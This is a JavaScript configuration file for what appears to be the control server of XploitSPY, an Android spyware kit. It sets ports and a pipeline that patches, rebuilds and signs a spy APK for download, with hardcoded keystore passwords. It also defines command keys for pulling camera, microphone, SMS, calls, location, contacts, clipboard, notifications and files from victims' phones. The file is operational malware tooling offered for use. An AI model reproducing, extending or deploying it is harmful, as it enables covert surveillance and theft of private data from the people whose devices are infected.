const path = require('path');

exports.debug = false;

exports.web_port = 80;
exports.control_port = 22222;

// Paths
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
exports.apkOutputPath = path.join(__dirname, '../assets/webpublic')
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/XploitSPY.apk')

exports.downloadsFolder = '/client_downloads'
exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)

exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
exports.apkSign = path.join(__dirname, '../app/factory/', 'uber-apk-signer-1.1.0.jar');
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
exports.certPath = path.join(__dirname, '../app/factory/release.jks');
//exports.certPk8Path = path.join(__dirname, '../app/factory/testkey.pk8');
// exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/remote/app/IOSocket.smali');
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/remote/app/h.smali');

exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
//exports.signCommand = 'java -jar "' + exports.apkSign + '"  "' + exports.certPemPath + '"  "' + exports.certPk8Path + '"  "' + exports.apkBuildPath + '"  "' + exports.apkOutputPath + '"'; // <-- fix output
exports.signCommand = 'java -jar "' + exports.apkSign + '" -a  "' + exports.apkBuildPath + '" --ks "' + exports.certPath + '"  --ksAlias key0 --ksPass release101 --ksKeyPass release101 --out  "' + exports.apkOutputPath + '"'; // <-- fix output

exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP'
}

exports.logTypes = {
    error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
}